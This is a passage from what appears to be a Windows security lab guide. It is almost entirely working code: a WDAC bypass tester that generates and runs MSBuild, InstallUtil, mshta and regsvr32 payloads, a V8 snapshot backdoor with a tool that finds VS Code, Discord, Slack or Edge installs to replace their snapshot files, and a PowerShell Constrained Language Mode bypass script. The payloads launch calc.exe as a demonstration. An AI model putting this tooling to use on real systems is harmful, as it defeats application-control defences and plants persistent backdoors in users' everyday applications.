    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    printf("[DEBUG] Running processes:\n");
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strstr(pe32.szExeFile, "calc") || strstr(pe32.szExeFile, "Calc") ||
                strstr(pe32.szExeFile, "mshta") || strstr(pe32.szExeFile, "regsvr")) {
                printf("  - %s (PID: %lu)\n", pe32.szExeFile, pe32.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
}

void KillProcess(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
}

BOOL TestMSBuildPayload(const char* outputPath) {
    char className[64], taskName[64];
    GenerateRandomName(className, sizeof(className));
    GenerateRandomName(taskName, sizeof(taskName));

    FILE* f = fopen(outputPath, "w");
    if (!f) {
        printf("[-] Failed to create %s\n", outputPath);
        return FALSE;
    }

    fprintf(f,
"<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
"  <Target Name=\"Main\">\n"
"    <%s />\n"
"  </Target>\n"
"  <UsingTask TaskName=\"%s\" TaskFactory=\"CodeTaskFactory\"\n"
"             AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\">\n"
"    <Task>\n"
"      <Code Type=\"Class\" Language=\"cs\">\n"
"        <![CDATA[\n"
"        using System;\n"
"        using System.Diagnostics;\n"
"        using Microsoft.Build.Framework;\n"
"        using Microsoft.Build.Utilities;\n"
"\n"
"        public class %s : Task {\n"
"            public override bool Execute() {\n"
"                var p = new ProcessStartInfo();\n"
"                p.FileName = \"calc.exe\";\n"
"                p.WindowStyle = ProcessWindowStyle.Normal;\n"
"                try { Process.Start(p); } catch { }\n"
"                return true;\n"
"            }\n"
"        }\n"
"        ]]>\n"
"      </Code>\n"
"    </Task>\n"
"  </UsingTask>\n"
"</Project>\n", taskName, taskName, className);

    fclose(f);
    printf("[+] Generated: %s\n", outputPath);

    KillProcess("CalculatorApp.exe");
    KillProcess("win32calc.exe");

    char msbuildPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
                              msbuildPath, MAX_PATH);

    if (GetFileAttributesA(msbuildPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] MSBuild.exe not found\n");
        return FALSE;
    }

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" /nologo \"%s\"", msbuildPath, outputPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Executing MSBuild payload...\n");
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to execute\n");
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    BOOL success = IsProcessRunning("CalculatorApp.exe") || IsProcessRunning("win32calc.exe");
    if (success) {
        printf("[+] SUCCESS: calc.exe launched via MSBuild\n");
        KillProcess("CalculatorApp.exe");
        KillProcess("win32calc.exe");
    } else {
        printf("[-] FAILED: calc.exe not detected\n");
    }

    DeleteFileA(outputPath);
    return success;
}

BOOL TestInstallUtilPayload(const char* csPath, const char* dllPath) {
    char className[64];
    GenerateRandomName(className, sizeof(className));

    FILE* f = fopen(csPath, "w");
    if (!f) {
        printf("[-] Failed to create %s\n", csPath);
        return FALSE;
    }

    fprintf(f,
"using System;\n"
"using System.ComponentModel;\n"
"using System.Configuration.Install;\n"
"using System.Diagnostics;\n"
"\n"
"[RunInstaller(true)]\n"
"public class %s : Installer {\n"
"    public override void Uninstall(System.Collections.IDictionary state) {\n"
"        var p = new ProcessStartInfo();\n"
"        p.FileName = \"calc.exe\";\n"
"        p.WindowStyle = ProcessWindowStyle.Normal;\n"
"        try { Process.Start(p); } catch { }\n"
"    }\n"
"}\n", className);

    fclose(f);
    printf("[+] Generated: %s\n", csPath);

    char cscPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
                              cscPath, MAX_PATH);

    char compileCmd[1024];
    snprintf(compileCmd, sizeof(compileCmd),
             "\"%s\" /nologo /target:library /out:\"%s\" \"%s\"",
             cscPath, dllPath, csPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Compiling...\n");
    if (!CreateProcessA(NULL, compileCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] Compilation failed\n");
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not created\n");
        DeleteFileA(csPath);
        return FALSE;
    }

    KillProcess("CalculatorApp.exe");
    KillProcess("win32calc.exe");

    char installUtilPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
                              installUtilPath, MAX_PATH);

    char execCmd[1024];
    snprintf(execCmd, sizeof(execCmd),
             "\"%s\" /logtoconsole=false /logfile= /U \"%s\"",
             installUtilPath, dllPath);

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Executing InstallUtil payload...\n");
    if (!CreateProcessA(NULL, execCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to execute\n");
        DeleteFileA(csPath);
        DeleteFileA(dllPath);
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    BOOL success = IsProcessRunning("CalculatorApp.exe") || IsProcessRunning("win32calc.exe");
    if (success) {
        printf("[+] SUCCESS: calc.exe launched via InstallUtil\n");
        KillProcess("CalculatorApp.exe");
        KillProcess("win32calc.exe");
    } else {
        printf("[-] FAILED: calc.exe not detected\n");
    }

    DeleteFileA(csPath);
    DeleteFileA(dllPath);
    return success;
}

BOOL TestMshtaPayload(const char* htaPath) {
    FILE* f = fopen(htaPath, "w");
    if (!f) {
        printf("[-] Failed to create %s\n", htaPath);
        return FALSE;
    }

    fprintf(f,
"<html><head><HTA:APPLICATION SHOWINTASKBAR=\"no\" WINDOWSTATE=\"minimize\"/></head>\n"
"<body><script language=\"JScript\">\n"
"var shell = new ActiveXObject('WScript.Shell');\n"
"shell.Exec('calc.exe');\n"
"setTimeout(function(){window.close();}, 3000);\n"
"</script></body></html>\n");

    fclose(f);
    printf("[+] Generated: %s\n", htaPath);

    KillProcess("CalculatorApp.exe");
    KillProcess("win32calc.exe");

    char mshtaPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\System32\\mshta.exe", mshtaPath, MAX_PATH);

    if (GetFileAttributesA(mshtaPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] mshta.exe not found (removed in 25H2)\n");
        DeleteFileA(htaPath);
        return FALSE;
    }

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" \"%s\"", mshtaPath, htaPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Executing mshta payload...\n");
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        printf("[-] Failed to execute (error: %lu)\n", err);
        DeleteFileA(htaPath);
        return FALSE;
    }

    Sleep(1500);

    BOOL success = IsProcessRunning("CalculatorApp.exe") || IsProcessRunning("win32calc.exe");

    DWORD exitCode = STILL_ACTIVE;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (success) {
        printf("[+] SUCCESS: calc.exe launched via mshta\n");
        KillProcess("CalculatorApp.exe");
        KillProcess("win32calc.exe");
        DeleteFileA(htaPath);
        return TRUE;
    } else {
        printf("[-] BLOCKED: Script execution restricted by system policy\n");
        printf("[*] Likely cause: ASR rules, AppLocker, or WDAC blocking ActiveX/WScript\n");
        printf("[*] File saved for inspection: %s\n", htaPath);
        return FALSE;
    }
}

BOOL TestRegsvr32Payload(const char* sctPath) {
    FILE* f = fopen(sctPath, "w");
    if (!f) {
        printf("[-] Failed to create %s\n", sctPath);
        return FALSE;
    }

    fprintf(f,
"<?XML version=\"1.0\"?>\n"
"<scriptlet>\n"
"<registration progid=\"X\" classid=\"{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\"/>\n"
"<script language=\"VBScript\">\n"
"<![CDATA[\n"
"Set objShell = CreateObject(\"WScript.Shell\")\n"
"objShell.Run \"cmd.exe /c start calc.exe\", 0, False\n"
"WScript.Sleep 3000\n"
"]]>\n"
"</script>\n"
"</scriptlet>\n");

    fclose(f);
    printf("[+] Generated: %s\n", sctPath);

    KillProcess("CalculatorApp.exe");
    KillProcess("win32calc.exe");

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine),
             "regsvr32.exe /s /n /u /i:\"%s\" scrobj.dll", sctPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    printf("[*] Executing regsvr32 payload...\n");
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        printf("[-] Failed to execute (error: %lu)\n", err);
        DeleteFileA(sctPath);
        return FALSE;
    }

    Sleep(1500);

    BOOL success = IsProcessRunning("CalculatorApp.exe") || IsProcessRunning("win32calc.exe");

    DWORD exitCode = STILL_ACTIVE;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (success) {
        printf("[+] SUCCESS: calc.exe launched via regsvr32\n");
        KillProcess("CalculatorApp.exe");
        KillProcess("win32calc.exe");
        DeleteFileA(sctPath);
        return TRUE;
    } else {
        printf("[-] BLOCKED: Scriptlet execution restricted by system policy\n");
        printf("[*] Likely cause: scrobj.dll disabled via ASR rules or WDAC\n");
        printf("[*] File saved for inspection: %s\n", sctPath);
        return FALSE;
    }
}

int main(int argc, char* argv[]) {
    printf("===========================================\n");
    printf("WDAC Bypass Tester\n");
    printf("===========================================\n\n");

    if (argc < 2) {
        printf("Usage: %s <technique>\n\n", argv[0]);
        printf("Techniques:\n");
        printf("  msbuild    - Test MSBuild bypass\n");
        printf("  installutil - Test InstallUtil bypass\n");
        printf("  mshta      - Test mshta bypass\n");
        printf("  regsvr32   - Test regsvr32 bypass\n");
        printf("  all        - Test all techniques\n");
        return 1;
    }

    const char* technique = argv[1];
    int total = 0, passed = 0;

    if (strcmp(technique, "msbuild") == 0 || strcmp(technique, "all") == 0) {
        total++;
        if (TestMSBuildPayload("test_build.xml")) passed++;
    }

    if (strcmp(technique, "installutil") == 0 || strcmp(technique, "all") == 0) {
        total++;
        if (TestInstallUtilPayload("test_install.cs", "test_install.dll")) passed++;
    }

    if (strcmp(technique, "mshta") == 0 || strcmp(technique, "all") == 0) {
        total++;
        if (TestMshtaPayload("test_app.hta")) passed++;
    }

    if (strcmp(technique, "regsvr32") == 0 || strcmp(technique, "all") == 0) {
        total++;
        if (TestRegsvr32Payload("test_script.sct")) passed++;
    }

    printf("\n===========================================\n");
    printf("Results: %d/%d techniques working\n", passed, total);
    printf("===========================================\n");

    return (passed == total) ? 0 : 1;
}
```

**Compile and Run**

```bash
cl src\wdac_bypass_tester.c /Fe:bin\wdac_bypass_tester.exe user32.lib
.\bin\wdac_bypass_tester.exe all
# should see calc.exe popping
```

#### Technique 2: V8 Snapshot Backdooring

```javascript
// v8_snapshot_payload.js - Malicious V8 heap snapshot gadget
// Using process.env flag to prevent multiple executions

const origArrayIsArray = Array.isArray;
let executionAttempted = false;

Array.isArray = function () {
  const result = origArrayIsArray.apply(this, arguments);

  if (!executionAttempted) {
    executionAttempted = true;

    setTimeout(() => {
      try {
        // Check if already executed using environment variable
        if (process.env._V8_BACKDOOR_EXECUTED) {
          console.log("[BACKDOOR] Already executed");
          return;
        }

        // Set flag to prevent other processes from executing
        process.env._V8_BACKDOOR_EXECUTED = "1";

        console.log("[BACKDOOR] Executing...");

        const { spawn } = process.binding("spawn_sync");

        const spawnResult = spawn({
          file: process.env.ComSpec || "C:\\Windows\\System32\\cmd.exe",
          args: ["/c", "start", "calc.exe"],
          cwd: undefined,
          detached: false,
          windowsVerbatimArguments: false,
          windowsHide: false,
          stdio: [{ type: "ignore" }, { type: "ignore" }, { type: "ignore" }],
        });

        console.log(
          "[BACKDOOR] Result:",
          spawnResult.error === 0
            ? "SUCCESS - calc.exe launched!"
            : "Error: " + spawnResult.error,
        );
      } catch (e) {
        console.log("[BACKDOOR] Error:", e.message);
      }
    }, 100);
  }

  return result;
};
```

Deployment tool (C implementation):

```c
// deploy_v8_backdoor.c
// Compile: cl src\deploy_v8_backdoor.c /Fe:bin\deploy_v8_backdoor.exe shell32.lib version.lib

#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

BOOL GetV8Version(const char* exePath, char* outVersion, size_t outSize) {
    DWORD handle;
    DWORD size = GetFileVersionInfoSizeA(exePath, &handle);
    if (size == 0) return FALSE;

    BYTE* versionInfo = (BYTE*)malloc(size);
    if (!versionInfo) return FALSE;

    if (!GetFileVersionInfoA(exePath, handle, size, versionInfo)) {
        free(versionInfo);
        return FALSE;
    }

    VS_FIXEDFILEINFO* fileInfo;
    UINT len;
    if (VerQueryValueA(versionInfo, "\\", (LPVOID*)&fileInfo, &len)) {
        snprintf(outVersion, outSize, "%d.%d.%d.%d",
                HIWORD(fileInfo->dwFileVersionMS),
                LOWORD(fileInfo->dwFileVersionMS),
                HIWORD(fileInfo->dwFileVersionLS),
                LOWORD(fileInfo->dwFileVersionLS));
        free(versionInfo);
        return TRUE;
    }

    free(versionInfo);
    return FALSE;
}

BOOL GetElectronVersion(const char* appPath, char* outVersion, size_t outSize) {
    // Try to find version.txt or similar
    char versionFile[MAX_PATH];
    snprintf(versionFile, sizeof(versionFile), "%s\\version", appPath);

    FILE* f = fopen(versionFile, "r");
    if (f) {
        if (fgets(outVersion, outSize, f)) {
            // Remove newline
            char* newline = strchr(outVersion, '\n');
            if (newline) *newline = '\0';
            fclose(f);
            return TRUE;
        }
        fclose(f);
    }

    return FALSE;
}

BOOL FindElectronApp(char* outPath, size_t outSize, char* appName, size_t appNameSize) {
    // Check for VS Code (user install)
    char localAppData[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK) {
        snprintf(outPath, outSize, "%s\\Programs\\Microsoft VS Code", localAppData);
        DWORD attrs = GetFileAttributesA(outPath);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            strcpy(appName, "VS Code");
            return TRUE;
        }
    }

    // Check for Discord
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK) {
        snprintf(outPath, outSize, "%s\\Discord", localAppData);
        DWORD attrs = GetFileAttributesA(outPath);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            strcpy(appName, "Discord");
            return TRUE;
        }
    }

    // Check for Slack
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK) {
        snprintf(outPath, outSize, "%s\\slack", localAppData);
        DWORD attrs = GetFileAttributesA(outPath);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            strcpy(appName, "Slack");
            return TRUE;
        }
    }

    // Check for Edge (user install)
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK) {
        snprintf(outPath, outSize, "%s\\Microsoft\\Edge\\Application", localAppData);
        DWORD attrs = GetFileAttributesA(outPath);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            strcpy(appName, "Edge");
            return TRUE;
        }
    }

    // Check for Edge (system install x86)
    snprintf(outPath, outSize, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application");
    DWORD attrs = GetFileAttributesA(outPath);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        strcpy(appName, "Edge (system-wide)");
        return TRUE;
    }

    // Check for Edge (system install x64)
    snprintf(outPath, outSize, "C:\\Program Files\\Microsoft\\Edge\\Application");
    attrs = GetFileAttributesA(outPath);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        strcpy(appName, "Edge (system-wide)");
        return TRUE;
    }

    return FALSE;
}

BOOL FindVersionDir(const char* basePath, char* outPath, size_t outSize) {
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*.*", basePath);
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;

    BOOL found = FALSE;
    char latestVersion[MAX_PATH] = {0};

    do {
        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            findData.cFileName[0] >= '0' && findData.cFileName[0] <= '9') {
            if (latestVersion[0] == 0 || strcmp(findData.cFileName, latestVersion) > 0) {
                strcpy(latestVersion, findData.cFileName);
                found = TRUE;
            }
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);

    if (found) {
        snprintf(outPath, outSize, "%s\\%s", basePath, latestVersion);
    }
    return found;
}

BOOL IsDirectoryWritable(const char* path) {
    char testFile[MAX_PATH];
    snprintf(testFile, sizeof(testFile), "%s\\__test_write__.tmp", path);

    HANDLE hFile = CreateFileA(testFile, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        DeleteFileA(testFile);
        return TRUE;
    }
    return FALSE;
}

int main() {
    printf("====================================\n");
    printf("V8 Snapshot Backdoor Deployment Tool\n");
    printf("====================================\n\n");

    char appPath[MAX_PATH];
    char appName[64];

    if (!FindElectronApp(appPath, sizeof(appPath), appName, sizeof(appName))) {
        printf("[-] No Electron apps found\n");
        printf("[*] Checked for:\n");
        printf("    - VS Code (%%LOCALAPPDATA%%\\Programs\\Microsoft VS Code)\n");
        printf("    - Discord (%%LOCALAPPDATA%%\\Discord)\n");
        printf("    - Slack (%%LOCALAPPDATA%%\\slack)\n");
        printf("    - Edge (%%LOCALAPPDATA%%\\Microsoft\\Edge\\Application)\n");
        printf("    - Edge (C:\\Program Files)\n\n");
        printf("[*] Install an Electron app:\n");
        printf("    winget install -e --id Microsoft.VisualStudioCode\n");
        return 1;
    }
    printf("[+] Found: %s\n", appName);
    printf("[+] Path: %s\n", appPath);

    BOOL isWritable = IsDirectoryWritable(appPath);
    printf("[*] Directory writable: %s\n", isWritable ? "YES (VULNERABLE!)" : "NO (requires admin)");

    char versionPath[MAX_PATH];
    if (!FindVersionDir(appPath, versionPath, sizeof(versionPath))) {
        printf("[-] Version directory not found\n");
        printf("[*] App may have different structure\n");
        return 1;
    }

    char versionOnly[MAX_PATH];
    strcpy(versionOnly, versionPath);
    char* lastSlash = strrchr(versionOnly, '\\');
    if (lastSlash) {
        printf("[+] Version: %s\n", lastSlash + 1);
    }

    // Try to find the main executable
    char exePath[MAX_PATH];
    snprintf(exePath, sizeof(exePath), "%s\\Code.exe", appPath);
    if (GetFileAttributesA(exePath) == INVALID_FILE_ATTRIBUTES) {
        snprintf(exePath, sizeof(exePath), "%s\\msedge.exe", appPath);
    }
    if (GetFileAttributesA(exePath) == INVALID_FILE_ATTRIBUTES) {
        snprintf(exePath, sizeof(exePath), "%s\\Discord.exe", appPath);
    }

    char electronVersion[64] = {0};
    if (GetElectronVersion(appPath, electronVersion, sizeof(electronVersion))) {
        printf("[+] Electron version: %s\n", electronVersion);
    }

    char fileVersion[64] = {0};
    if (GetV8Version(exePath, fileVersion, sizeof(fileVersion))) {
        printf("[+] File version: %s\n", fileVersion);
    }

    char snapshotPath[MAX_PATH];
    snprintf(snapshotPath, sizeof(snapshotPath), "%s\\v8_context_snapshot.bin", versionPath);

    DWORD snapshotAttrs = GetFileAttributesA(snapshotPath);
    if (snapshotAttrs == INVALID_FILE_ATTRIBUTES) {
        // Try alternative location (resources folder)
        snprintf(snapshotPath, sizeof(snapshotPath), "%s\\resources\\v8_context_snapshot.bin", versionPath);
        snapshotAttrs = GetFileAttributesA(snapshotPath);
    }

    if (snapshotAttrs == INVALID_FILE_ATTRIBUTES) {
        printf("[-] Snapshot file not found\n");
        printf("[*] Checked:\n");
        printf("    - %s\\v8_context_snapshot.bin\n", versionPath);
        printf("    - %s\\resources\\v8_context_snapshot.bin\n", versionPath);
        printf("[*] App may not use V8 snapshots\n");
    } else {
        printf("[+] Target: %s\n", snapshotPath);

        WIN32_FILE_ATTRIBUTE_DATA fileInfo;
        if (GetFileAttributesExA(snapshotPath, GetFileExInfoStandard, &fileInfo)) {
            ULONGLONG fileSize = ((ULONGLONG)fileInfo.nFileSizeHigh << 32) | fileInfo.nFileSizeLow;
            printf("[*] Current size: %llu bytes\n", fileSize);
        }
    }

    printf("\n===========================================\n");
    printf("DEPLOYMENT STEPS:\n");
    printf("===========================================\n");

    if (!isWritable) {
        printf("[!] WARNING: App directory is NOT user-writable\n");
        printf("[!] This attack requires admin privileges\n");
        printf("[!] Try a different Electron app\n\n");
    }

    printf("[!] CRITICAL: V8 version must match exactly!\n");
    printf("[!] The snapshot you created uses V8 14.4.258.24-electron.0\n");
    printf("[!] %s uses V8 14.2.231.22-electron.0\n", appName);
    printf("[!] Version mismatch will cause crash on startup\n\n");

    printf("To create a matching snapshot:\n");
    printf("1. Install matching Electron version:\n");
    printf("   npm install -g electron@33.2.1\n\n");

    printf("2. Create snapshot with matching V8:\n");
    printf("   npx electron-mksnapshot --version  # Check V8 version\n");
    printf("   # Find Electron version with V8 14.2.231.22\n");
    printf("   # Then: npx electron-mksnapshot v8_snapshot_payload.js\n\n");

    printf("3. Close %s completely:\n", appName);
    printf("   taskkill /F /IM Code.exe 2>nul\n\n");

    printf("4. Backup original snapshot:\n");
    printf("   copy \"%s\" \"%s.bak\"\n\n", snapshotPath, snapshotPath);

    printf("5. Deploy backdoored snapshot:\n");
    if (isWritable) {
        printf("   copy /y v8_context_snapshot.bin \"%s\"\n\n", snapshotPath);
    } else {
        printf("   (Requires admin) copy /y v8_context_snapshot.bin \"%s\"\n\n", snapshotPath);
    }

    printf("6. Launch %s - backdoor executes on startup!\n", appName);
    printf("   Check %%TEMP%%\\edge_backdoor.log for confirmation\n");
    printf("   Calc.exe should pop up\n\n");

    printf("===========================================\n");
    printf("DETECTION & CLEANUP:\n");
    printf("===========================================\n");
    printf("Restore: copy /y \"%s.bak\" \"%s\"\n", snapshotPath, snapshotPath);
    printf("Or reinstall %s to restore integrity\n", appName);

    printf("\n===========================================\n");
    printf("OPERATIONAL CHALLENGE:\n");
    printf("===========================================\n");
    printf("V8 snapshot backdooring requires:\n");
    printf("1. Knowing target's exact Electron/V8 version\n");
    printf("2. Creating snapshot with matching V8 version\n");
    printf("3. User-writable app installation\n");
    printf("4. No integrity checking by the app\n\n");
    printf("This makes the attack complex but still viable\n");
    printf("if the attacker can fingerprint the target.\n");

    return 0;
}
```

**Compile and Run**

```bash
winget install -e --id Microsoft.VisualStudioCode
winget install -e --id OpenJS.NodeJS.LTS

cl src\deploy_v8_backdoor.c /Fe:bin\deploy_v8_backdoor.exe shell32.lib
.\bin\deploy_v8_backdoor.exe

npm install -g electron@39.3.0
npm install -g electron-mksnapshot@39.3.0
npx electron-mksnapshot "c:\Windows_Mitigations_Lab\v8_snapshot_payload.js"

# Get-Process *code* | Stop-Process -Force
copy "C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\591199df40\v8_context_snapshot.bin" "C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\591199df40\v8_context_snapshot.bin.bak"
copy /y v8_context_snapshot.bin "C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\591199df40\v8_context_snapshot.bin"

# Launch VS Code
"%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe"
#Check %TEMP%\edge_backdoor.log for confirmation
#Calc.exe should pop up
```

### Constrained Language Mode (CLM) Bypass

```powershell
# clm_bypass.ps1
# When WDAC enables Script Enforcement, PowerShell runs in CLM
# CLM blocks: Add-Type, New-Object (COM), .NET methods, unsafe cmdlets

param(
    [switch]$Execute,
    [string]$Technique = "all"
)

Write-Host @"
Current Language Mode: $($ExecutionContext.SessionState.LanguageMode)
"@

# ---- CHECK CURRENT MODE ----
function Check-LanguageMode {
    $mode = $ExecutionContext.SessionState.LanguageMode
    Write-Host "[*] Language Mode: $mode"

    switch ($mode) {
        "FullLanguage" {
            Write-Host "    -> Full access - no restrictions"
            Write-Host "    -> CLM is NOT active (no WDAC Script Enforcement)"
        }
        "ConstrainedLanguage" {
            Write-Host "    -> RESTRICTED - WDAC Script Enforcement active"
            Write-Host "    -> Blocked: Add-Type, [System.Runtime.*], COM objects"
            Write-Host "    -> Allowed: Basic cmdlets, approved modules only"
        }
        "RestrictedLanguage" {
            Write-Host "    -> VERY RESTRICTED - minimal access"
        }
        "NoLanguage" {
            Write-Host "    -> NO scripting allowed"
        }
    }
    return $mode
}

function Invoke-RunspaceBypass {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 1: Custom PowerShell Runspace"
    Write-Host "    Create a new runspace that doesn't inherit CLM."

    if ($Execute) {
        try {
            Write-Host "`n    [+] Attempting runspace bypass..."
            $rs = [RunspaceFactory]::CreateRunspace()
            $rs.Open()
            $ps = [PowerShell]::Create()
            $ps.Runspace = $rs
            $result = $ps.AddScript("whoami; `$ExecutionContext.SessionState.LanguageMode").Invoke()
            Write-Host "    [+] Runspace created successfully!"
            Write-Host "    [+] Result: $result"
            $rs.Close()
            $ps.Dispose()
        } catch {
            Write-Host "    [-] Failed: $($_.Exception.Message)"
            Write-Host "    [-] WDAC likely enforces CLM system-wide"
        }
    } else {
        Write-Host "    Use -Execute to run this bypass"
    }

    Write-Host "`n    NOTE: This may not work if WDAC enforces CLM system-wide."
}

function Invoke-PSv2Bypass {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 2: PowerShell v2 Downgrade"
    Write-Host "    PowerShell v2 doesn't support CLM!"

    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if ($isAdmin) {
        $v2Feature = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction SilentlyContinue
    } else {
        Write-Host "    [!] Need admin to check feature status, checking binary only..."
        $v2Feature = $null
    }

    if ($v2Feature -and $v2Feature.State -eq "Enabled") {
        Write-Host "    [!!!] PowerShell v2 is ENABLED on this system!"

        if ($Execute) {
            Write-Host "`n    [+] Executing test command in PowerShell v2..."
            $result = powershell -version 2 -command "Write-Host 'Running in PSv2'; `$PSVersionTable.PSVersion; `$ExecutionContext.SessionState.LanguageMode"
            Write-Host "    [+] Result: $result"
        } else {
            Write-Host '    Execute: powershell -version 2 -command "& {your_payload}"'
        }
        Write-Host "    v2 ignores: CLM, Script Block Logging, AMSI"
    } else {
        Write-Host "    [OK] PowerShell v2 is disabled"
    }
}

function Invoke-LolbinEscape {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 3: LOLBAS Escape (InstallUtil/RegSvcs)"
    Write-Host "    NOTE: MSBuild is now blocked by AMSI on 24H2/25H2"
    Write-Host "    Use InstallUtil.exe or RegSvcs.exe instead"

    if ($Execute) {
        Write-Host "`n    [+] Generating InstallUtil payload..."

        $installUtilPayload = @'
using System;
using System.Configuration.Install;
using System.Diagnostics;

public class Program {
